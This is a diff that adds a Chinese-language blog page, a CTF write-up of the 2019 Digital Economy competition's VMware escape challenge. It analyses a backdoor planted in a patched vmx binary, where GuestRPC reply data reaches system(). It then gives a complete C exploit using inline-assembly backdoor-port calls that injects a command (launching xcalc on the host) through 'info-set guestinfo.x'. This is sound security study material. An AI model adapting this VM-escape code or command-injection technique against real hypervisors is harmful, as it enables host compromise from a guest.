@@ -1,0 +1,338 @@
+<!doctype html>
+<html lang="zh-CN" data-base="/">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2019 数字经济公测大赛 - VMware 逃逸 · Y0uYuGe</title>
+<meta name="description" content="其中出现了与通道有关的字符串 GuestMsg: Channel %u, Not enough memory to receive a message，再结合函数开头检查 number 是否位于 0-6 范围内的 switch-case，很容易联想到 GuestRPC Handler，即处理 RPC 通信的命令处理函数。下方代码仅保留漏洞所在部分，可以看到这条路径处理的是 subcommand=0x4，也就是接收回复数据。打开 GuestRPC 通道。">
+<link rel="stylesheet" href="/blog/article.css">
+</head>
+<body data-page="article">
+<header class="bar">
+  <a class="brand" href="/">Y0uYuGe</a>
+  <a class="tomap" href="/#/endpoint-security/virtualization-security/VMware/2019%20%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9B%20-%20VMware%20%E9%80%83%E9%80%B8" title="在导图上看这篇文章的位置">◎ 在导图中查看</a>
+</header>
+<div class="wrap">
+  <main class="post">
+    <nav class="crumbs"><a href="/#/">Y0uYuGe</a><span class="sep">›</span><a href="/#/endpoint-security">终端安全</a><span class="sep">›</span><a href="/#/endpoint-security/virtualization-security">虚拟化安全</a><span class="sep">›</span><a href="/#/endpoint-security/virtualization-security/VMware">VMware</a></nav>
+    <h1>2019 数字经济公测大赛 - VMware 逃逸</h1>
+    <div class="meta"><time>2024-07-25</time><span class="tag">#qt</span><span class="tag">#Programming Languages</span></div>
+    <article class="post-body">
+<h1 id="环境搭建">环境搭建</h1>
+<ul>
+<li>ubuntu :18.04.01</li>
+<li>vmware: VMware-Workstation-Full-15.5.0-14665864.x86_64.bundle
+<del>这里一直没把环境搭成功……打完补丁后报错，不知道怎么修</del> 后来发现补丁在被 IDA 加载后可能就不能用了，可能影响到了原补丁。重新下载补丁后发现可以运行，但没有网络……不过似乎自带 vmtools。</li>
+</ul>
+<h1 id="漏洞点">漏洞点</h1>
+<p>用 bindiff 对比原版 vmx 和打过补丁的版本，发现了下面的修改。
+<img src="/workspace/endpoint-security/virtualization-security/VMware/2019%20%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9B%20-%20VMware%20%E9%80%83%E9%80%B8/assets/csdn-140593470/image-001-95a2fd2899.png" alt="图片">
+将这里替换为 nop，并留下了一个后门。
+<img src="/workspace/endpoint-security/virtualization-security/VMware/2019%20%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9B%20-%20VMware%20%E9%80%83%E9%80%B8/assets/csdn-140593470/image-002-da13c4a88d.png" alt="图片"></p>
+<p>在 sub_16E220 函数开头，调用 sub_5463D0(1LL) 得到 v2，用来决定执行 switch 语句的哪个分支。各分支对应不同的 RPC 通信操作：
+打开 GuestRPC 通道
+发送命令长度
+发送命令数据
+接收回复长度
+接收回复数据
+发送接收完成信号
+关闭通道</p>
+<p>下面是 bindiff 中差异位置对应的反编译代码，属于 case 4。</p>
+<p>其中出现了与通道有关的字符串 GuestMsg: Channel %u, Not enough memory to receive a message，再结合函数开头检查 number 是否位于 0-6 范围内的 switch-case，很容易联想到 GuestRPC Handler，即处理 RPC 通信的命令处理函数。下方代码仅保留漏洞所在部分，可以看到这条路径处理的是 subcommand=0x4，也就是接收回复数据。</p>
+<pre><code class="language-c">   case 4u:
+      v49 = sub_16DE80(6LL, 7LL);
+      v8 = (_DWORD *)v49;
+      if ( !v49 )
+        goto LABEL_62;
+      LODWORD(v9) = *(_DWORD *)v49;
+      if ( *(_DWORD *)v49 != 3 )
+        goto LABEL_20;
+      if ( *(_BYTE *)(v49 + 8) == 1 )
+        goto LABEL_48;
+      if ( !*(_QWORD *)(v49 + 56) )
+        goto LABEL_90;
+      if ( (sub_5463D0(3LL) &amp; 1) == 0 )
+      {
+        v11 = (__int64)v8;
+        goto LABEL_81;
+      }
+      v36 = (unsigned __int64)&amp;stru_20000;
+      sub_546480(2LL, &amp;stru_20000);
+      v50 = (unsigned int)v8[12];
+      v51 = (unsigned __int16 *)(*((_QWORD *)v8 + 7) + (unsigned int)v8[11] - v50);
+      if ( (_DWORD)v50 == 2 )
+      {
+        v36 = *v51;
+        v37 = (_BYTE *)(&amp;dword_0 + 3);
+        sub_546480(3LL, v36);
+        v52 = v8[12] - 2;
+        v8[12] = v52;
+      }
+      else if ( (_DWORD)v50 == 3 )
+      {
+        v37 = (const char *)*((_QWORD *)v8 + 7);
+        system(v37);
+        v52 = v8[12] - 3;
+        v8[12] = v52;
+      }
+      else
+      {
+        if ( (_DWORD)v50 == 1 )
+        {
+          v36 = *(unsigned __int8 *)v51;
+          v37 = (_BYTE *)(&amp;dword_0 + 3);
+          sub_546480(3LL, v36);
+          v52 = v8[12] - 1;
+        }
+        else
+        {
+          v36 = *(unsigned int *)v51;
+          v37 = (_BYTE *)(&amp;dword_0 + 3);
+          sub_546480(3LL, v36);
+          v52 = v8[12] - 4;
+        }
+        v8[12] = v52;
+      }
+      if ( !v52 )
+        *v8 = 4;
+LABEL_31:
+      v44 = sub_533C10(v37, v36, v9);
+      v19 = 0x10000LL;
+      *((_QWORD *)v8 + 2) = v44;
+      goto LABEL_12;
+</code></pre>
+<p>这里的 need 表示尚未发送的数据长度。当 need &gt;= 4 时，每次发送 4 字节，最后对 need &lt; 4 的情况作特殊处理。后门函数就位于 need == 3 的判断中。</p>
+<p>另外，调试发现 state == 3 对应宿主机向客户机回复数据的阶段。因此，需要宿主机回复给客户机的数据长度对 4 取模等于 3，同时 buf 恰好是要执行的命令。</p>
+<p>调试发现，回复数据的长度等于 info-set guestinfo.x 后面的字符串长度加 2，执行的命令也正好是这个字符串，只是在前面多了两个字节，包含字符 1。recv rpc data 中提到，rpctype 的前两个字节表示成功或失败；Receive RPC reply length 中也提到，回复数据的前两个字节始终表示 RPC 命令的状态。因此，need 的最终总长度就是 info-set guestinfo.x 后面的字符串长度加 2，即 <code>1 string</code>，buf 则指向这段内容的起始地址。所以 system 执行命令时，执行的是 <code>1 string</code>。为了执行 string 中的命令，要让字符串以 ; 开头，将前面的内容截断。最后，只需保证字符串长度加 2 后对 4 取模等于 3，也就是字符串长度对 4 取模等于 1。</p>
+<p>这里的 <code>;</code> 已经占了一个字符，因此只要保证其余部分的长度是 4 的倍数即可。这样就可以执行任意命令：可以通过添加空格补齐长度，并在最后加上 ; 或 &amp;，否则虚拟机会出问题。
+<img src="/workspace/endpoint-security/virtualization-security/VMware/2019%20%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9B%20-%20VMware%20%E9%80%83%E9%80%B8/assets/csdn-140593470/image-003-a1e09c74c4.png" alt="图片"></p>
+<p>另外，执行命令的参数前面固定带有 1。我在它后面追加 ; 来执行下一条命令，所以最终要执行的命令是 /usr/bin/xcalc ;。</p>
+<h1 id="exp">exp</h1>
+<pre><code class="language-c">#include &lt;ctype.h&gt;
+#include &lt;stdint-gcc.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+void byte_dump(char *desc, void *addr, int len) {
+    uint8_t *buf8 = (unsigned char *) addr;
+    if (desc != NULL) {
+        printf(&quot;[*] %s:\n&quot;, desc);
+    }
+    for (int i = 0; i &lt; len; i += 16) {
+        printf(&quot;  %04x&quot;, i);
+        for (int j = 0; j &lt; 16; j++) {
+            i + j &lt; len ? printf(&quot; %02x&quot;, buf8[i + j]) : printf(&quot;   &quot;);
+        }
+        printf(&quot;   &quot;);
+        for (int j = 0; j &lt; 16 &amp;&amp; j + i &lt; len; j++) {
+            printf(&quot;%c&quot;, isprint(buf8[i + j]) ? buf8[i + j] : &#39;.&#39;);
+        }
+        puts(&quot;&quot;);
+    }
+}
+void channel_open(int *cookie1, int *cookie2, int *channel_num, int *res) {
+    asm(&quot;movl %%eax,%%ebx\n\t&quot;
+        &quot;movq %%rdi,%%r10\n\t&quot;
+        &quot;movq %%rsi,%%r11\n\t&quot;
+        &quot;movq %%rdx,%%r12\n\t&quot;
+        &quot;movq %%rcx,%%r13\n\t&quot;
+        &quot;movl $0x564d5868,%%eax\n\t&quot;
+        &quot;movl $0xc9435052,%%ebx\n\t&quot;
+        &quot;movl $0x1e,%%ecx\n\t&quot;
+        &quot;movl $0x5658,%%edx\n\t&quot;
+        &quot;out %%eax,%%dx\n\t&quot;
+        &quot;movl %%edi,(%%r10)\n\t&quot;
+        &quot;movl %%esi,(%%r11)\n\t&quot;
+        &quot;movl %%edx,(%%r12)\n\t&quot;
+        &quot;movl %%ecx,(%%r13)\n\t&quot;
+        :
+        :
+        : &quot;%rax&quot;, &quot;%rbx&quot;, &quot;%rcx&quot;, &quot;%rdx&quot;, &quot;%rsi&quot;, &quot;%rdi&quot;, &quot;%r8&quot;, &quot;%r10&quot;, &quot;%r11&quot;, &quot;%r12&quot;, &quot;%r13&quot;);
+}
+
+void channel_set_len(int cookie1, int cookie2, int channel_num, int len, int *res) {
+    asm(&quot;movl %%eax,%%ebx\n\t&quot;
+        &quot;movq %%r8,%%r10\n\t&quot;
+        &quot;movl %%ecx,%%ebx\n\t&quot;
+        &quot;movl $0x564d5868,%%eax\n\t&quot;
+        &quot;movl $0x0001001e,%%ecx\n\t&quot;
+        &quot;movw $0x5658,%%dx\n\t&quot;
+        &quot;out %%eax,%%dx\n\t&quot;
+        &quot;movl %%ecx,(%%r10)\n\t&quot;
+        :
+        :
+        : &quot;%rax&quot;, &quot;%rbx&quot;, &quot;%rcx&quot;, &quot;%rdx&quot;, &quot;%rsi&quot;, &quot;%rdi&quot;, &quot;%r10&quot;);
+}
+
+void channel_send_data(int cookie1, int cookie2, int channel_num, int len, char *data, int *res) {
+    asm(&quot;pushq %%rbp\n\t&quot;
+        &quot;movq %%r9,%%r10\n\t&quot;
+        &quot;movq %%r8,%%rbp\n\t&quot;
+        &quot;movq %%rcx,%%r11\n\t&quot;
+        &quot;movq $0,%%r12\n\t&quot;
+        &quot;1:\n\t&quot;
+        &quot;movq %%r8,%%rbp\n\t&quot;
+        &quot;add %%r12,%%rbp\n\t&quot;
+        &quot;movl (%%rbp),%%ebx\n\t&quot;
+        &quot;movl $0x564d5868,%%eax\n\t&quot;
+        &quot;movl $0x0002001e,%%ecx\n\t&quot;
+        &quot;movw $0x5658,%%dx\n\t&quot;
+        &quot;out %%eax,%%dx\n\t&quot;
+        &quot;addq $4,%%r12\n\t&quot;
+        &quot;cmpq %%r12,%%r11\n\t&quot;
+        &quot;ja 1b\n\t&quot;
+        &quot;movl %%ecx,(%%r10)\n\t&quot;
+        &quot;popq %%rbp\n\t&quot;
+        :
+        :
+        : &quot;%rax&quot;, &quot;%rbx&quot;, &quot;%rcx&quot;, &quot;%rdx&quot;, &quot;%rsi&quot;, &quot;%rdi&quot;, &quot;%r10&quot;, &quot;%r11&quot;, &quot;%r12&quot;);
+}
+
+void channel_recv_reply_len(int cookie1, int cookie2, int channel_num, int *len, int *res) {
+    asm(&quot;movl %%eax,%%ebx\n\t&quot;
+        &quot;movq %%r8,%%r10\n\t&quot;
+        &quot;movq %%rcx,%%r11\n\t&quot;
+        &quot;movl $0x564d5868,%%eax\n\t&quot;
+        &quot;movl $0x0003001e,%%ecx\n\t&quot;
+        &quot;movw $0x5658,%%dx\n\t&quot;
+        &quot;out %%eax,%%dx\n\t&quot;
+        &quot;movl %%ecx,(%%r10)\n\t&quot;
+        &quot;movl %%ebx,(%%r11)\n\t&quot;
+        :
+        :
+        : &quot;%rax&quot;, &quot;%rbx&quot;, &quot;%rcx&quot;, &quot;%rdx&quot;, &quot;%rsi&quot;, &quot;%rdi&quot;, &quot;%r10&quot;, &quot;%r11&quot;);
+}
+
+void channel_recv_data(int cookie1, int cookie2, int channel_num, int offset, char *data, int *res) {
+    asm(&quot;pushq %%rbp\n\t&quot;
+        &quot;movq %%r9,%%r10\n\t&quot;
+        &quot;movq %%r8,%%rbp\n\t&quot;
+        &quot;movq %%rcx,%%r11\n\t&quot;
+        &quot;movq $1,%%rbx\n\t&quot;
+        &quot;movl $0x564d5868,%%eax\n\t&quot;
+        &quot;movl $0x0004001e,%%ecx\n\t&quot;
+        &quot;movw $0x5658,%%dx\n\t&quot;
+        &quot;in %%dx,%%eax\n\t&quot;
+        &quot;add %%r11,%%rbp\n\t&quot;
+        &quot;movl %%ebx,(%%rbp)\n\t&quot;
+        &quot;movl %%ecx,(%%r10)\n\t&quot;
+        &quot;popq %%rbp\n\t&quot;
+        :
+        :
+        : &quot;%rax&quot;, &quot;%rbx&quot;, &quot;%rcx&quot;, &quot;%rdx&quot;, &quot;%rsi&quot;, &quot;%rdi&quot;, &quot;%r10&quot;, &quot;%r11&quot;, &quot;%r12&quot;);
+}
+
+void channel_recv_finish(int cookie1, int cookie2, int channel_num, int *res) {
+    asm(&quot;movl %%eax,%%ebx\n\t&quot;
+        &quot;movq %%rcx,%%r10\n\t&quot;
+        &quot;movq $0x1,%%rbx\n\t&quot;
+        &quot;movl $0x564d5868,%%eax\n\t&quot;
+        &quot;movl $0x0005001e,%%ecx\n\t&quot;
+        &quot;movw $0x5658,%%dx\n\t&quot;
+        &quot;out %%eax,%%dx\n\t&quot;
+        &quot;movl %%ecx,(%%r10)\n\t&quot;
+        :
+        :
+        : &quot;%rax&quot;, &quot;%rbx&quot;, &quot;%rcx&quot;, &quot;%rdx&quot;, &quot;%rsi&quot;, &quot;%rdi&quot;, &quot;%r10&quot;);
+}
+
+void channel_recv_finish2(int cookie1, int cookie2, int channel_num, int *res) {
+    asm(&quot;movl %%eax,%%ebx\n\t&quot;
+        &quot;movq %%rcx,%%r10\n\t&quot;
+        &quot;movq $0x21,%%rbx\n\t&quot;
+        &quot;movl $0x564d5868,%%eax\n\t&quot;
+        &quot;movl $0x0005001e,%%ecx\n\t&quot;
+        &quot;movw $0x5658,%%dx\n\t&quot;
+        &quot;out %%eax,%%dx\n\t&quot;
+        &quot;movl %%ecx,(%%r10)\n\t&quot;
+        :
+        :
+        : &quot;%rax&quot;, &quot;%rbx&quot;, &quot;%rcx&quot;, &quot;%rdx&quot;, &quot;%rsi&quot;, &quot;%rdi&quot;, &quot;%r10&quot;);
+}
+
+void channel_close(int cookie1, int cookie2, int channel_num, int *res) {
+    asm(&quot;movl %%eax,%%ebx\n\t&quot;
+        &quot;movq %%rcx,%%r10\n\t&quot;
+        &quot;movl $0x564d5868,%%eax\n\t&quot;
+        &quot;movl $0x0006001e,%%ecx\n\t&quot;
+        &quot;movw $0x5658,%%dx\n\t&quot;
+        &quot;out %%eax,%%dx\n\t&quot;
+        &quot;movl %%ecx,(%%r10)\n\t&quot;
+        :
+        :
+        : &quot;%rax&quot;, &quot;%rbx&quot;, &quot;%rcx&quot;, &quot;%rdx&quot;, &quot;%rsi&quot;, &quot;%rdi&quot;, &quot;%r10&quot;);
+}
+
+typedef struct {
+    int cookie1;
+    int cookie2;
+    int num;
+} channel;
+
+void run_cmd(char *cmd) {
+    channel cannel;
+    int res, len;
+    channel_open(&amp;cannel.cookie1, &amp;cannel.cookie2, &amp;cannel.num, &amp;res);
+    if (!res) {
+        puts(&quot;[-] fail to open channel.&quot;);
+        exit(EXIT_FAILURE);
+    }
+    channel_set_len(cannel.cookie1, cannel.cookie2, cannel.num, strlen(cmd), &amp;res);
+    if (!res) {
+        puts(&quot;[-] fail to set len&quot;);
+        exit(EXIT_FAILURE);
+    }
+    channel_send_data(cannel.cookie1, cannel.cookie2, cannel.num, strlen(cmd), cmd, &amp;res);
+
+    channel_recv_reply_len(cannel.cookie1, cannel.cookie2, cannel.num, &amp;len, &amp;res);
+    if (!res) {
+        puts(&quot;[-] fail to recv data len&quot;);
+        exit(EXIT_FAILURE);
+    }
+    printf(&quot;[*] recv len:%d\n&quot;, len);
+
+    char *data = malloc(len);
+    memset(data, 0, len );
+    for (int i = 0; i &lt; len ; i += 4) {
+        channel_recv_data(cannel.cookie1, cannel.cookie2, cannel.num, i, data, &amp;res);
+    }
+
+    byte_dump(&quot;recv data&quot;, data, len );
+
+    channel_recv_finish(cannel.cookie1, cannel.cookie2, cannel.num, &amp;res);
+    if (!res) {
+        puts(&quot;[-] fail to recv finish&quot;);
+        exit(EXIT_FAILURE);
+    }
+
+    channel_close(cannel.cookie1, cannel.cookie2, cannel.num, &amp;res);
+    if (!res) {
+        puts(&quot;[-] fail to close channel&quot;);
+        exit(EXIT_FAILURE);
+    }
+}
+
+int main() {
+    run_cmd(&quot;info-set guestinfo.x ;/usr/bin/xcalc ;&quot;);
+    run_cmd(&quot;info-get guestinfo.x&quot;);
+    return 0;
+}
+</code></pre>
+<p>asm 中各个冒号的含义：</p>
+<ul>
+<li>第一个冒号后为空，表示没有输出操作数。</li>
+<li>第二个冒号后为空，表示没有输入操作数。</li>
+<li>第三个冒号后是被修改的寄存器列表，用于告诉编译器嵌入式汇编代码会修改哪些寄存器。</li>
+</ul>
+<p><img src="/workspace/endpoint-security/virtualization-security/VMware/2019%20%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9B%20-%20VMware%20%E9%80%83%E9%80%B8/assets/csdn-140593470/image-004-d54d87deb2.png" alt="图片"></p>
+
+    </article>
+    
+    <nav class="pn"><span></span><a href="/workspace/endpoint-security/virtualization-security/VMware/CTF%20Pwn%20%E8%99%9A%E6%8B%9F%E5%8C%96%EF%BC%9AVMware%20%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/"><span class="l">下一篇</span>CTF Pwn 虚拟化：VMware 前置知识</a></nav>
+  </main>
+  
+</div>
+<script type="module" src="/blog/article.js"></script>
+</body>
+</html>
